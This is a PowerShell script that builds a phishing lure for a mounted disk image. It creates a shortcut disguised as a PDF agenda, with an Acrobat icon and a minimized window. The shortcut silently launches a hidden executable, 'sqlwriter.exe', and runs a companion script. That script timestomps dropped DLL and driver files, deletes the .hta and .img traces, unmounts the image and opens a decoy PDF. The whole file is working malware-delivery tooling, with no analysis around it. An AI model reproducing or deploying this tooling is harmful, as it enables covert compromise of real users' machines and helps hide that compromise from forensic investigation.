$IsoRoot = "C:\tmp\SHARE_1\DocShare"
$VolumeName = "DocShare"
$LnkPath = Join-Path $IsoRoot "Agenda_15-19_6-2026.pdf.lnk"
$CleanupPath = Join-Path $IsoRoot "Microsoft\DocShare.ps1"

$microsoftDir = Split-Path -Parent $CleanupPath
if (-not (Test-Path -LiteralPath $microsoftDir)) {
    New-Item -ItemType Directory -Path $microsoftDir -Force | Out-Null
}

@'
$stampSource = Join-Path $env:WINDIR 'System32\Windows.CloudStore.Schema.Shell.dll'

function Apply-StampTimes {
    param([string[]]$Paths)

    if (-not (Test-Path -LiteralPath $stampSource -PathType Leaf)) {
        return
    }

    $timestamp = (Get-Item -LiteralPath $stampSource -Force).LastWriteTime
    foreach ($target in $Paths) {
        if (-not (Test-Path -LiteralPath $target)) {
            continue
        }
        try {
            $item = Get-Item -LiteralPath $target -Force
            $item.CreationTime = $timestamp
            $item.LastAccessTime = $timestamp
            $item.LastWriteTime = $timestamp
        } catch { }
    }
}

Start-Sleep -Seconds 5

$htaPath = Join-Path $env:PUBLIC 'Downloads\DocShare.hta'
if (Test-Path -LiteralPath $htaPath) {
    Remove-Item -LiteralPath $htaPath -Force -ErrorAction SilentlyContinue
}

$deadline = (Get-Date).AddSeconds(45)

do {
    $v = Get-Volume -FileSystemLabel 'DocShare' -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $v -or -not $v.DriveLetter) {
        break
    }

    $driveRoot = ('{0}:\' -f $v.DriveLetter)
    $pdfSrc = Join-Path $driveRoot 'Shared Documents\Agenda_15-19_6-2026.pdf'
    $pdfDir = Join-Path $env:PUBLIC 'Downloads'
    $pdfDst = Join-Path $pdfDir 'Agenda_15-19_6-2026.pdf'
    $imgDst = Join-Path $pdfDir 'DocShare.img'
    $dllDrop = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\CloudStore\Shell\Windows.CloudStore.Schema.Shell.dll'
    $sysDrop = Join-Path $env:ProgramData 'Adobe\ARM\Reader_26.001.21563\Library\Drivers\amd64.sys'

    try {
        if (-not (Test-Path -LiteralPath $pdfDir)) {
            New-Item -ItemType Directory -Path $pdfDir -Force | Out-Null
        }
        Copy-Item -LiteralPath $pdfSrc -Destination $pdfDst -Force -ErrorAction Stop
    } catch { }

    Apply-StampTimes -Paths @($pdfDst, $dllDrop, $sysDrop)

    try {
        $shell = New-Object -ComObject Shell.Application
        foreach ($window in @($shell.Windows())) {
            try {
                $path = $window.Document.Folder.Self.Path
                if ($path -and $path.StartsWith($driveRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
                    $window.Quit()
                }
            } catch { }
        }
    } catch { }

    Start-Sleep -Milliseconds 500
    try {
        Get-DiskImage -Volume $v -ErrorAction Stop | Dismount-DiskImage -ErrorAction Stop
        if (Test-Path -LiteralPath $imgDst) {
            Remove-Item -LiteralPath $imgDst -Force -ErrorAction SilentlyContinue
        }
        if (Test-Path -LiteralPath $pdfDst) {
            Start-Process -FilePath $pdfDst
        }
        break
    } catch {
        Start-Sleep -Seconds 2
    }
} while ((Get-Date) -lt $deadline)
'@ | Set-Content -LiteralPath $CleanupPath -Encoding UTF8

$psCmd = @(
    '$v=''DocShare'''
    '$d=(gwmi Win32_LogicalDisk|?{$_.VolumeName-eq$v}|select -f 1).DeviceID'
    'if($d){start ($d+''\Microsoft\sqlwriter.exe'') -wi h;iex([IO.File]::ReadAllText($d+''\Microsoft\DocShare.ps1''))}'
) -join ';'

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($LnkPath)
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$argLine = "-Command `"$psCmd`""
if ($argLine.Length -gt 260) {
    throw "Shortcut Arguments too long ($($argLine.Length) > 260): $argLine"
}
$Shortcut.Arguments = $argLine
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = "$env:ProgramFiles\Adobe\Acrobat DC\Acrobat\Acrobat.exe,-2"
$Shortcut.Description = "Agenda_15-19_6-2026.pdf"
$Shortcut.Save()

Write-Host "[+] Created: $LnkPath ($($argLine.Length) char Arguments)"
Write-Host "[+] Created: $CleanupPath"
